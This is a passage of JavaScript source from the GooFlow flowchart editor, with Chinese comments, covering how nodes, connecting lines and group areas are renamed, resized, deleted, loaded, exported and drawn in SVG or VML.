if(type===\"line\"){//如果是线\r\n\t\t\t\tif(!this.$lineData[id])\treturn;\r\n\t\t\t\tif(this.$lineData[id].name===name)\treturn;\r\n\t\t\t\tif(typeof this.onItemRename==='function' && this.onItemRename(id,name,\"node\")===false)\treturn;\r\n\t\t\t\toldName=this.$lineData[id].name;\r\n\t\t\t\tthis.$lineData[id].name=name;\r\n\t\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[2].textContent=name;\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[1].innerHTML=name;\r\n\t\t\t\t\tvar n=this.$lineDom[id].getAttribute(\"fromTo\").split(\",\");\r\n\t\t\t\t\tvar x;\r\n\t\t\t\t\tif(this.$lineData[id].type!==\"lr\"){\r\n\t\t\t\t\t\tx=(n[2]-n[0])/2;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\tvar Min=n[2]>n[0]? n[0]:n[2];\r\n\t\t\t\t\t\tif(Min>this.$lineData[id].M) Min=this.$lineData[id].M;\r\n\t\t\t\t\t\tx=this.$lineData[id].M-Min;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif(x<0) x=x*-1;\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[1].style.left=x-this.$lineDom[id].childNodes[1].offsetWidth/2+4+\"px\";\r\n\t\t\t\t}\r\n\t\t\t\tif(this.$editable){\r\n\t\t\t\t\tthis.$lineData[id].alt=true;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse if(type===\"area\"){//如果是分组区域\r\n\t\t\t\tif(!this.$areaData[id])\treturn;\r\n\t\t\t\tif(this.$areaData[id].name===name)\treturn;\r\n\t\t\t\tif(typeof this.onItemRename==='function' && this.onItemRename(id,name,\"node\")===false)\treturn;\r\n\t\t\t\toldName=this.$areaData[id].name;\r\n\t\t\t\tthis.$areaData[id].name=name;\r\n\t\t\t\tthis.$areaDom[id].children(\"label\").text(name);\r\n\t\t\t\tif(this.$editable){\r\n\t\t\t\t\tthis.$areaData[id].alt=true;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,oldName,type];\r\n\t\t\t\tthis.pushOper(\"setName\",paras);\r\n\t\t\t}\r\n\t\t},\r\n\t\t//设置结点的尺寸,仅支持非开始/结束结点\r\n\t\tresizeNode:function(id,width,height){\r\n\t\t\tif(!this.$nodeData[id])\treturn;\r\n\t\t\tif(typeof this.onItemResize==='function' && this.onItemResize(id,\"node\",width,height)===false)\treturn;\r\n\t\t\tif(this.$nodeData[id].type===\"start\"||this.$nodeData[id].type===\"end\")return;\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$nodeData[id].width,this.$nodeData[id].height];\r\n\t\t\t\tthis.pushOper(\"resizeNode\",paras);\r\n\t\t\t}\r\n\r\n\t\t\tthis.$nodeDom[id].children(\"table\").css({width:(width-2)*this.$scale+\"px\",height:(height-2)*this.$scale+\"px\"});\r\n\t\t\t//确保因内部文字太多而撑大时，宽高尺寸仍然是精确的\r\n\t\t\twidth=this.$nodeDom[id].outerWidth();\r\n\t\t\theight=this.$nodeDom[id].outerHeight();\r\n\t\t\tthis.$nodeDom[id].children(\"table\").css({width:width-2+\"px\",height:height-2+\"px\"});\r\n\t\t\t//确保因内部文字太多而撑大时，宽高尺寸仍然是精确的 END\r\n\t\t\tthis.$nodeData[id].width=width;\r\n\t\t\tthis.$nodeData[id].height=height;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$nodeData[id].alt=true;\r\n\t\t\t}\r\n\t\t\t//重画转换线\r\n\t\t\tthis.resetLines(id,this.$nodeData[id]);\r\n\t\t\tthis._node2Area(id);\r\n\t\t},\r\n\t\t//删除结点\r\n\t\tdelNode:function(id,trigger){\r\n\t\t\tif(!this.$nodeData[id])\treturn;\r\n\t\t\tif(false!==trigger && typeof this.onItemDel==='function' && this.onItemDel(id,\"node\")===false)\treturn;\r\n\t\t\t//先删除可能的连线\r\n\t\t\tfor(var k in this.$lineData){\r\n\t\t\t\tif(this.$lineData[k].from===id||this.$lineData[k].to===id){\r\n\t\t\t\t\t//this.$draw.removeChild(this.$lineDom[k]);\r\n\t\t\t\t\t//delete this.$lineData[k];\r\n\t\t\t\t\t//delete this.$lineDom[k];\r\n\t\t\t\t\tthis.delLine(k,false);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t//再删除结点本身\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$nodeData[id]];\r\n\t\t\t\tthis.pushOper(\"addNode\",paras);\r\n\t\t\t}\r\n\t\t\tdelete this.$nodeData[id];\r\n\t\t\tthis.$nodeDom[id].remove();\r\n\t\t\tdelete this.$nodeDom[id];\r\n\t\t\t--this.$nodeCount;\r\n\t\t\tif(this.$focus===id)\tthis.$focus=\"\";\r\n\r\n\t\t\tif(this.$editable){\r\n\t\t\t\t//在回退新增操作时,如果节点ID以this.$id+\"_node_\"开头,则表示为本次编辑时新加入的节点,这些节点的删除不用加入到$deletedItem中\r\n\t\t\t\t//if(id.indexOf(this.$id+\"_node_\")<0)\r\n\t\t\t\tthis.$deletedItem[id]=\"node\";\r\n\t\t\t}\r\n\t\t},\r\n\t\t//设置流程图的名称\r\n\t\tsetTitle:function(text){\r\n\t\t\tthis.$title=text;\r\n\t\t\tif(this.$head)\tthis.$head.children(\"label\").attr(\"title\",text).text(text);\r\n\t\t},\r\n\t\t//仅供内部使用：计算流程图的实际宽高（单位像素）\r\n\t\t_suitSize:function(){\r\n\t\t\tvar maxW=0,maxH=0;\r\n\t\t\tfor(var k1 in this.$nodeData){\r\n\t\t\t\tvar node = this.$nodeData[k1];\r\n\t\t\t\tif(maxW < node.width+node.left){\r\n\t\t\t\t\tmaxW = node.width+node.left;\r\n\t\t\t\t}\r\n\t\t\t\tif(maxH < node.height+node.top){\r\n\t\t\t\t\tmaxH = node.height+node.top;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tfor(var k2 in this.$areaData){\r\n\t\t\t\tvar area = this.$areaData[k2];\r\n\t\t\t\tif(maxW < area.width+area.left){\r\n\t\t\t\t\tmaxW = area.width+area.left;\r\n\t\t\t\t}\r\n\t\t\t\tif(maxH < area.height+area.top){\r\n\t\t\t\t\tmaxH = area.height+area.top;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tfor(var k3 in this.$lineData){\r\n\t\t\t\tvar line = this.$lineData[k3];\r\n\t\t\t\tif(line.M && line.type===\"lt\" && maxW < line.M ){\r\n\t\t\t\t\tmaxW = M+4;\r\n\t\t\t\t}\r\n\t\t\t\tif(line.M && line.type===\"tb\" && maxH < line.M ){\r\n\t\t\t\t\tmaxH = M+4;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\treturn {width:maxW,height:maxH}\r\n\r\n\t\t},\r\n\t\t//载入一组数据\r\n\t\tloadData:function(data){\r\n\t\t\tvar t=this.$editable;\r\n\t\t\tthis.$editable=false;\r\n\t\t\tif(data.title)\tthis.setTitle(data.title);\r\n\t\t\tif(data.initNum)\tthis.$max=data.initNum;\r\n\t\t\tfor(var i in data.nodes)\r\n\t\t\t\tthis.addNode(i,data.nodes[i]);\r\n\t\t\tfor(var j in data.lines)\r\n\t\t\t\tthis.addLine(j,data.lines[j]);\r\n\t\t\tfor(var k in data.areas)\r\n\t\t\t\tthis.addArea(k,data.areas[k]);\r\n\t\t\tthis.$editable=t;\r\n\t\t\tthis.$deletedItem={};\r\n\t\t\t//自行重构工作区，使之大小自适应\r\n\t\t\tvar width=this.$workArea.width();\r\n\t\t\tvar height=this.$workArea.height();\r\n\t\t\tvar max=this._suitSize();\r\n\t\t\twhile(max.width>width){\r\n\t\t\t\twidth+=this.$workExtendStep;\r\n\t\t\t}\r\n\t\t\twhile(max.height>height){\r\n\t\t\t\theight+=this.$workExtendStep;\r\n\t\t\t}\r\n\t\t\tthis.$workArea.css({height:height+\"px\",width:width+\"px\"});\r\n\t\t\tif(GooFlow.prototype.useSVG===\"\"){\r\n\t\t\t\tthis.$draw.coordsize = width+\",\"+height;\r\n\t\t\t}\r\n\t\t\tthis.$draw.style.width = width + \"px\";\r\n\t\t\tthis.$draw.style.height = height + \"px\";\r\n\t\t\tif(this.$group!=null){\r\n\t\t\t\tthis.$group.css({height:height+\"px\",width:width+\"px\"});\r\n\t\t\t}\r\n\t\t},\r\n\t\t//用AJAX方式，远程读取一组数据\r\n\t\t//参数para为JSON结构，与JQUERY中$.ajax()方法的传参一样\r\n\t\tloadDataAjax:function(para){\r\n\t\t\tvar This=this;\r\n\t\t\t$.ajax({\r\n\t\t\t\ttype:para.type,\r\n\t\t\t\turl:para.url,\r\n\t\t\t\tdataType:\"json\",\r\n\t\t\t\tdata:para.data,\r\n\t\t\t\tsuccess: function(msg){\r\n\t\t\t\t\tif(para['dataFilter'])\tpara['dataFilter'](msg,\"json\");\r\n\t\t\t\t\tThis.loadData(msg);\r\n\t\t\t\t\tif(para.success)\tpara.success(msg);\r\n\t\t\t\t},\r\n\t\t\t\terror: function(XMLHttpRequest, textStatus, errorThrown){\r\n\t\t\t\t\tif(para.error)\tpara.error(textStatus,errorThrown);\r\n\t\t\t\t}\r\n\t\t\t})\r\n\t\t},\r\n\t\t//把画好的整个流程图导出到一个变量中(其实也可以直接访问GooFlow对象的$nodeData,$lineData,$areaData这三个JSON属性)\r\n\t\texportData:function(){\r\n\t\t\tvar ret={};\r\n\t\t\tret.title=this.$title;\r\n\t\t\tret.nodes={};\r\n\t\t\tret.lines={};\r\n\t\t\tret.areas={};\r\n\t\t\tret.initNum=this.$max;\r\n\t\t\tfor(var k1 in this.$nodeData){\r\n\t\t\t\tif(!this.$nodeData[k1].marked){\r\n\t\t\t\t\tdelete this.$nodeData[k1][\"marked\"];\r\n\t\t\t\t}\r\n\t\t\t\tret.nodes[k1]=JSON.parse(JSON.stringify(this.$nodeData[k1]));\r\n\t\t\t}\r\n\t\t\tfor(var k2 in this.$lineData){\r\n\t\t\t\tif(!this.$lineData[k2].marked){\r\n\t\t\t\t\tdelete this.$lineData[k2][\"marked\"];\r\n\t\t\t\t}\r\n\t\t\t\tret.lines[k2]=JSON.parse(JSON.stringify(this.$lineData[k2]));\r\n\t\t\t}\r\n\t\t\tfor(var k3 in this.$areaData){\r\n\t\t\t\tif(!this.$areaData[k3].marked){\r\n\t\t\t\t\tdelete this.$areaData[k3][\"marked\"];\r\n\t\t\t\t}\r\n\t\t\t\tret.areas[k3]=JSON.parse(JSON.stringify(this.$areaData[k3]));\r\n\t\t\t}\r\n\t\t\treturn ret;\r\n\t\t},\r\n\t\t//只把本次编辑流程图中作了变更(包括增删改)的元素导出到一个变量中,以方便用户每次编辑载入的流程图后只获取变更过的数据\r\n\t\texportAlter:function(){\r\n\t\t\tvar ret={nodes:{},lines:{},areas:{}};\r\n\t\t\tfor(var k1 in this.$nodeData){\r\n\t\t\t\tif(this.$nodeData[k1].alt){\r\n\t\t\t\t\tret.nodes[k1]=this.$nodeData[k1];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tfor(var k2 in this.$lineData){\r\n\t\t\t\tif(this.$lineData[k2].alt){\r\n\t\t\t\t\tret.lines[k2]=this.$lineData[k2];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tfor(var k3 in this.$areaData){\r\n\t\t\t\tif(this.$areaData[k3].alt){\r\n\t\t\t\t\tret.areas[k3]=this.$areaData[k3];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tret.deletedItem=this.$deletedItem;\r\n\t\t\treturn ret;\r\n\t\t},\r\n\t\t//变更元素的ID,一般用于快速保存后,将后台返回新元素的ID更新到页面中;type为元素类型(节点,连线,区块)\r\n\t\ttransNewId:function(oldId,newId,type){\r\n\t\t\tvar tmp;\r\n\t\t\tswitch(type){\r\n\t\t\t\tcase \"node\":\r\n\t\t\t\t\tif(this.$nodeData[oldId]){\r\n\t\t\t\t\t\ttmp=this.$nodeData[oldId];\r\n\t\t\t\t\t\tdelete this.$nodeData[oldId];\r\n\t\t\t\t\t\tthis.$nodeData[newId]=tmp;\r\n\t\t\t\t\t\ttmp=this.$nodeDom[oldId].attr(\"id\",newId);\r\n\t\t\t\t\t\tdelete this.$nodeDom[oldId];\r\n\t\t\t\t\t\tthis.$nodeDom[newId]=tmp;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase \"line\":\r\n\t\t\t\t\tif(this.$lineData[oldId]){\r\n\t\t\t\t\t\ttmp=this.$lineData[oldId];\r\n\t\t\t\t\t\tdelete this.$lineData[oldId];\r\n\t\t\t\t\t\tthis.$lineData[newId]=tmp;\r\n\t\t\t\t\t\ttmp=this.$lineDom[oldId].attr(\"id\",newId);\r\n\t\t\t\t\t\tdelete this.$lineDom[oldId];\r\n\t\t\t\t\t\tthis.$lineDom[newId]=tmp;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase \"area\":\r\n\t\t\t\t\tif(this.$areaData[oldId]){\r\n\t\t\t\t\t\ttmp=this.$areaData[oldId];\r\n\t\t\t\t\t\tdelete this.$areaData[oldId];\r\n\t\t\t\t\t\tthis.$areaData[newId]=tmp;\r\n\t\t\t\t\t\ttmp=this.$areaDom[oldId].attr(\"id\",newId);\r\n\t\t\t\t\t\tdelete this.$areaDom[oldId];\r\n\t\t\t\t\t\tthis.$areaDom[newId]=tmp;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t},\r\n\t\t//清空工作区及已载入的数据\r\n\t\tclearData:function(){\r\n\t\t\tfor(var k1 in this.$nodeData){\r\n\t\t\t\tthis.delNode(k1);\r\n\t\t\t}\r\n\t\t\tfor(var k2 in this.$lineData){\r\n\t\t\t\tthis.delLine(k2);\r\n\t\t\t}\r\n\t\t\tfor(var k3 in this.$areaData){\r\n\t\t\t\tthis.delArea(k3);\r\n\t\t\t}\r\n\t\t\tthis.$deletedItem={};\r\n\t\t},\r\n\t\t//销毁自己\r\n\t\tdestrory:function(){\r\n\t\t\tthis.$bgDiv.empty();\r\n\t\t\tthis.$lineData=null;\r\n\t\t\tthis.$nodeData=null;\r\n\t\t\tthis.$lineDom=null;\r\n\t\t\tthis.$nodeDom=null;\r\n\t\t\tthis.$areaDom=null;\r\n\t\t\tthis.$areaData=null;\r\n\t\t\tthis.$nodeCount=0;\r\n\t\t\tthis.$areaCount=0;\r\n\t\t\tthis.$areaCount=0;\r\n\t\t\tthis.$deletedItem={};\r\n\t\t},\r\n///////////以下为有关画线的方法\r\n\t\t//绘制一条箭头线，并返回线的DOM\r\n\t\tdrawLine:function(id,sp,ep,mark,dash,$scale){\r\n\t\t\tvar line,text;\r\n\t\t\tvar x=(ep[0]+sp[0])/2, y=(ep[1]+sp[1])/2;\r\n\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\tline=document.createElementNS(\"http://www.w3.org/2000/svg\",\"g\");\r\n\t\t\t\tvar hi=document.createElementNS(\"http://www.w3.org/2000/svg\",\"path\");\r\n\t\t\t\tvar path=document.createElementNS(\"http://www.w3.org/2000/svg\",\"path\");\r\n\r\n\t\t\t\tif(id!==\"\")\tline.setAttribute(\"id\",id);\r\n\t\t\t\tline.setAttribute(\"from\",sp[0]+\",\"+sp[1]);\r\n\t\t\t\tline.setAttribute(\"to\",ep[0]+\",\"+ep[1]);\r\n\t\t\t\thi.setAttribute(\"visibility\",\"hidden\");\r\n\t\t\t\thi.setAttribute(\"stroke-width\",'9');\r\n\t\t\t\thi.setAttribute(\"fill\",\"none\");\r\n\t\t\t\thi.setAttribute(\"stroke\",\"white\");\r\n\t\t\t\thi.setAttribute(\"d\",\"M \"+sp[0]+\" \"+sp[1]+\" L \"+ep[0]+\" \"+ep[1]);\r\n\t\t\t\thi.setAttribute(\"pointer-events\",\"stroke\");\r\n\t\t\t\tpath.setAttribute(\"d\",\"M \"+sp[0]+\" \"+sp[1]+\" L \"+ep[0]+\" \"+ep[1]);\r\n\t\t\t\tpath.setAttribute(\"stroke-width\",mark? '2.4':'1.4');\r\n\t\t\t\tpath.setAttribute(\"stroke-linecap\",\"round\");\r\n\t\t\t\tpath.setAttribute(\"fill\",\"none\");\r\n\t\t\t\tif(dash)\tpath.setAttribute(\"style\", \"stroke-dasharray:6,5\");\r\n\t\t\t\tif(mark){\r\n\t\t\t\t\tpath.setAttribute(\"stroke\",GooFlow.color.mark);\r\n\t\t\t\t\tpath.setAttribute(\"marker-end\",\"url(#arrow2)\");\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tpath.setAttribute(\"stroke\",GooFlow.color.line);\r\n\t\t\t\t\tpath.setAttribute(\"marker-end\",\"url(#arrow1)\");\r\n\t\t\t\t}\r\n\t\t\t\tline.appendChild(hi);\r\n\t\t\t\tline.appendChild(path);\r\n\t\t\t\tline.style.cursor=\"crosshair\";\r\n\t\t\t\tif(id!==\"\"&&id!==\"GooFlow_tmp_line\"){\r\n\t\t\t\t\ttext=document.createElementNS(\"http://www.w3.org/2000/svg\",\"text\");\r\n\t\t\t\t\ttext.setAttribute(\"fill\",GooFlow.color.lineFont);\r\n\t\t\t\t\tline.appendChild(text);\r\n\r\n\t\t\t\t\ttext.setAttribute(\"text-anchor\",\"middle\");\r\n\t\t\t\t\ttext.setAttribute(\"x\",x+'');\r\n\t\t\t\t\ttext.setAttribute(\"y\",y+'');\r\n\t\t\t\t\ttext.style.cursor=\"text\";\r\n\t\t\t\t\ttext.style.fontSize=14*$scale+\"px\";\r\n\t\t\t\t\tline.style.cursor=\"pointer\";\r\n\t\t\t\t}\r\n\t\t\t}else{\r\n\t\t\t\tline=document.createElement(\"v:polyline\");\r\n\t\t\t\tif(id!==\"\")\tline.id=id;\r\n\t\t\t\t//line.style.position=\"absolute\";\r\n\t\t\t\tline.points.value=sp[0]+\",\"+sp[1]+\" \"+ep[0]+\",\"+ep[1];\r\n\t\t\t\tline.setAttribute(\"fromTo\",sp[0]+\",\"+sp[1]+\",\"+ep[0]+\",\"+ep[1]);\r\n\t\t\t\tline.strokeWeight=\"1.2\";\r\n\t\t\t\tline.stroke.EndArrow=\"Block\";\r\n\t\t\t\tline.style.cursor=\"crosshair\";\r\n\t\t\t\tif(id!==\"\"&&id!==\"GooFlow_tmp_line\"){\r\n\t\t\t\t\ttext=document.createElement(\"div\");\r\n\t\t\t\t\t//text.innerHTML=id;\r\n\t\t\t\t\tline.appendChild(text);\r\n\t\t\t\t\tif(x<0) x=x*-1;\r\n\t\t\t\t\tif(y<0) y=y*-1;\r\n\t\t\t\t\ttext.style.left=x+\"px\";\r\n\t\t\t\t\ttext.style.top=y-6+\"px\";\r\n\t\t\t\t\ttext.style.color=GooFlow.color.lineFont;\r\n\t\t\t\t\ttext.style.fontSize=14*$scale+\"px\";\r\n\t\t\t\t\tline.style.cursor=\"pointer\";\r\n\t\t\t\t}\r\n\t\t\t\tif(dash)\tline.stroke.dashStyle=\"Dash\";\r\n\t\t\t\tif(mark)\tline.strokeColor=GooFlow.color.mark;\r\n\t\t\t\telse\tline.strokeColor=GooFlow.color.line;\r\n\t\t\t\tline.fillColor=GooFlow.color.line;\r\n\t\t\t}\r\n\t\t\treturn line;\r\n\t\t},\r\n\t\t//画一条只有两个中点的折线\r\n\t\tdrawPoly:function(id,sp,m1,m2,ep,mark,dash,$scale){\r\n\t\t\tvar poly,strPath, text;\r\n\t\t\tvar x=(m2[0]+m1[0])/2, y=(m2[1]+m1[1])/2;\r\n\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\tpoly=document.createElementNS(\"http://www.w3.org/2000/svg\",\"g\");\r\n\t\t\t\tvar hi=document.createElementNS(\"http://www.w3.org/2000/svg\",\"path\");\r\n\t\t\t\tvar path=document.createElementNS(\"http://www.w3.org/2000/svg\",\"path\");\r\n\t\t\t\tif(id!==\"\")\tpoly.setAttribute(\"id\",id);\r\n\t\t\t\tpoly.setAttribute(\"from\",sp[0]+\",\"+sp[1]);\r\n\t\t\t\tpoly.setAttribute(\"to\",ep[0]+\",\"+ep[1]);\r\n\t\t\t\thi.setAttribute(\"visibility\",\"hidden\");\r\n\t\t\t\thi.setAttribute(\"stroke-width\",'9');\r\n\t\t\t\thi.setAttribute(\"fill\",\"none\");\r\n\t\t\t\thi.setAttribute(\"stroke\",\"white\");\r\n\t\t\t\tstrPath=\"M \"+sp[0]+\" \"+sp[1];\r\n\t\t\t\tif(m1[0]!==sp[0]||m1[1]!==sp[1])\r\n\t\t\t\t\tstrPath+=\" L \"+m1[0]+\" \"+m1[1];\r\n\t\t\t\tif(m2[0]!==ep[0]||m2[1]!==ep[1])\r\n\t\t\t\t\tstrPath+=\" L \"+m2[0]+\" \"+m2[1];\r\n\t\t\t\tstrPath+=\" L \"+ep[0]+\" \"+ep[1];\r\n\t\t\t\thi.setAttribute(\"d\",strPath);\r\n\t\t\t\thi.setAttribute(\"pointer-events\",\"stroke\");\r\n\t\t\t\tpath.setAttribute(\"d\",strPath);\r\n\t\t\t\tpath.setAttribute(\"stroke-width\",mark? '2.4':'1.4');\r\n\t\t\t\tpath.setAttribute(\"stroke-linecap\",\"round\");\r\n\t\t\t\tpath.setAttribute(\"fill\",\"none\");\r\n\t\t\t\tif(dash)\tpath.setAttribute(\"style\", \"stroke-dasharray:6,5\");\r\n\t\t\t\tif(mark){\r\n\t\t\t\t\tpath.setAttribute(\"stroke\",GooFlow.color.mark);\r\n\t\t\t\t\tpath.setAttribute(\"marker-end\",\"url(#arrow2)\");\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tpath.setAttribute(\"stroke\",GooFlow.color.line);\r\n\t\t\t\t\tpath.setAttribute(\"marker-end\",\"url(#arrow1)\");\r\n\t\t\t\t}\r\n\t\t\t\tpoly.appendChild(hi);\r\n\t\t\t\tpoly.appendChild(path);\r\n\t\t\t\ttext=document.createElementNS(\"http://www.w3.org/2000/svg\",\"text\");\r\n\t\t\t\ttext.setAttribute(\"fill\",GooFlow.color.lineFont);\r\n\t\t\t\tpoly.appendChild(text);\r\n\t\t\t\ttext.setAttribute(\"text-anchor\",\"middle\");\r\n\t\t\t\ttext.setAttribute(\"x\",x+'');\r\n\t\t\t\ttext.setAttribute(\"y\",y+'');\r\n\t\t\t\ttext.style.cursor=\"text\";\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tpoly=document.createElement(\"v:Polyline\");\r\n\t\t\t\tif(id!==\"\")\tpoly.id=id;\r\n\t\t\t\tpoly.filled=\"false\";\r\n\t\t\t\tstrPath=sp[0]+\",\"+sp[1];\r\n\t\t\t\tif(m1[0]!==sp[0]||m1[1]!==sp[1])\r\n\t\t\t\t\tstrPath+=\" \"+m1[0]+\",\"+m1[1];\r\n\t\t\t\tif(m2[0]!==ep[0]||m2[1]!==ep[1])\r\n\t\t\t\t\tstrPath+=\" \"+m2[0]+\",\"+m2[1];\r\n\t\t\t\tstrPath+=\" \"+ep[0]+\",\"+ep[1];\r\n\t\t\t\tpoly.points.value=strPath;\r\n\t\t\t\tpoly.setAttribute(\"fromTo\",sp[0]+\",\"+sp[1]+\",\"+ep[0]+\",\"+ep[1]);\r\n\t\t\t\tpoly.strokeWeight=mark? \"2.4\":\"1.2\";\r\n\t\t\t\tpoly.stroke.EndArrow=\"Block\";\r\n\t\t\t\ttext=document.createElement(\"div\");\r\n\t\t\t\t//text.innerHTML=id;\r\n\t\t\t\tpoly.appendChild(text);\r\n\t\t\t\tif(x<0) x=x*-1;\r\n\t\t\t\tif(y<0) y=y*-1;\r\n\t\t\t\ttext.style.left=x+\"px\";\r\n\t\t\t\ttext.style.top=y-4+\"px\";\r\n\t\t\t\ttext.style.color=GooFlow.color.lineFont;\r\n\t\t\t\tif(dash)\tpoly.stroke.dashStyle=\"Dash\";\r\n\t\t\t\tif(mark)\tpoly.strokeColor=GooFlow.color.mark;\r\n\t\t\t\telse\tpoly.strokeColor=GooFlow.color.line;\r\n\t\t\t}\r\n\t\t\tpoly.style.cursor=\"pointer\";\r\n\t\t\ttext.style.fontSize=14*$scale+\"px\";\r\n\t\t\treturn poly;\r\n\t\t},\r\n\t\t//原lineData已经设定好的情况下，只在绘图工作区画一条线的页面元素\r\n\t\taddLineDom:function(id,lineData){\r\n\t\t\tvar n1=this.$nodeData[lineData.from],n2=this.$nodeData[lineData.to];//获取开始/结束结点的数据\r\n\t\t\tif(!n1||!n2)\treturn;\r\n\t\t\t//开始计算线端点坐标\r\n\t\t\tvar res;\r\n\t\t\tif(lineData.type&&lineData.type!==\"sl\")\r\n\t\t\t\tres=calcPolyPoints(n1,n2,lineData.type,lineData.M, this.$scale);\r\n\t\t\telse\r\n\t\t\t\tres=calcStartEnd(n1,n2, this.$scale);\r\n\t\t\tif(!res)\treturn;\r\n\r\n\t\t\tif(lineData.type===\"sl\")\r\n\t\t\t\tthis.$lineDom[id]=GooFlow.prototype.drawLine(id,res.start,res.end,lineData.marked,lineData.dash, this.$scale);\r\n\t\t\telse\r\n\t\t\t\tthis.$lineDom[id]=GooFlow.prototype.drawPoly(id,res.start,res.m1,res.m2,res.end,lineData.marked,lineData.dash, this.$scale);\r\n\t\t\tthis.$draw.appendChild(this.$lineDom[id]);\r\n\t\t\tif(GooFlow.prototype.useSVG===\"\"){\r\n\t\t\t\tthis.$lineDom[id].childNodes[1].innerHTML=lineData.name;\r\n\t\t\t\tif(lineData.type!==\"sl\"){\r\n\t\t\t\t\tvar Min=(res.start[0]>res.end[0]? res.end[0]:res.start[0]);\r\n\t\t\t\t\tif(Min>res.m2[0])\tMin=res.m2[0];\r\n\t\t\t\t\tif(Min>res.m1[0])\tMin=res.m1[0];\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[1].style.left = (res.m2[0]+res.m1[0])/2-Min-this.$lineDom[id].childNodes[1].offsetWidth/2+4;\r\n\t\t\t\t\tMin=(res.start[1]>res.end[1]? res.end[1]:res.start[1]);\r\n\t\t\t\t\tif(Min>res.m2[1])\tMin=res.m2[1];\r\n\t\t\t\t\tif(Min>res.m1[1])\tMin=res.m1[1];\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[1].style.top = (res.m2[1]+res.m1[1])/2-Min-this.$lineDom[id].childNodes[1].offsetHeight/2;\r\n\t\t\t\t}else\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[1].style.left=\r\n\t\t\t\t\t\t((res.end[0]-res.start[0])*(res.end[0]>res.start[0]? 1:-1)-this.$lineDom[id].childNodes[1].offsetWidth)/2+4;\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tthis.$lineDom[id].childNodes[2].textContent=lineData.name;\r\n\t\t\t}\r\n\t\t},\r\n\t\t//增加一条线\r\n\t\taddLine:function(id,json){\r\n\t\t\tif(typeof this.onItemAdd==='function' && this.onItemAdd(id,\"line\",json)===false)return;\r\n\t\t\tif(this.$undoStack&&this.$editable){\r\n\t\t\t\tthis.pushOper(\"delLine\",[id]);\r\n\t\t\t}\r\n\t\t\tif(json.from===json.to)\treturn;\r\n\t\t\tvar n1=this.$nodeData[json.from],n2=this.$nodeData[json.to];//获取开始/结束结点的数据\r\n\t\t\tif(!n1||!n2)\treturn;\r\n\t\t\t//避免两个节点间不能有一条以上同向接连线\r\n\t\t\tfor(var k in this.$lineData){\r\n\t\t\t\tif((json.from===this.$lineData[k].from&&json.to===this.$lineData[k].to&&json.dash===this.$lineData[k].dash))\r\n\t\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\t//设置$lineData[id]\r\n\t\t\tthis.$lineData[id]={};\r\n\t\t\tif(json.type){\r\n\t\t\t\tthis.$lineData[id].type=json.type;\r\n\t\t\t\tthis.$lineData[id].M=json.M;\r\n\t\t\t}\r\n\t\t\telse\tthis.$lineData[id].type=\"sl\";//默认为直线\r\n\t\t\tthis.$lineData[id].from=json.from;\r\n\t\t\tthis.$lineData[id].to=json.to;\r\n\t\t\tthis.$lineData[id].name=json.name;\r\n\t\t\tif(json.marked)\tthis.$lineData[id].marked=json.marked;\r\n\t\t\telse\tthis.$lineData[id].marked=false;\r\n\t\t\tif(json.dash)\tthis.$lineData[id].dash=json.dash;\r\n\t\t\telse\tthis.$lineData[id].dash=false;\r\n\t\t\t//设置$lineData[id]完毕\r\n\r\n\t\t\tthis.addLineDom(id,this.$lineData[id]);\r\n\r\n\t\t\t++this.$lineCount;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$lineData[id].alt=true;\r\n\t\t\t\tif(this.$deletedItem[id])\tdelete this.$deletedItem[id];//在回退删除操作时,去掉该元素的删除记录\r\n\t\t\t}\r\n\t\t},\r\n\t\t//重构所有连向某个结点的线的显示，传参结构为$nodeData数组的一个单元结构\r\n\t\tresetLines:function(id,node){\r\n\t\t\tfor(var i in this.$lineData){\r\n\t\t\t\tvar other=null;//获取结束/开始结点的数据\r\n\t\t\t\tvar res;\r\n\t\t\t\tif(this.$lineData[i].from===id){//找结束点\r\n\t\t\t\t\tother=this.$nodeData[this.$lineData[i].to]||null;\r\n\t\t\t\t\tif(other==null)\tcontinue;\r\n\t\t\t\t\tif(this.$lineData[i].type===\"sl\")\r\n\t\t\t\t\t\tres=calcStartEnd(node,other, this.$scale);\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\tres=calcPolyPoints(node,other,this.$lineData[i].type,this.$lineData[i].M, this.$scale);\r\n\t\t\t\t\tif(!res)\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\telse 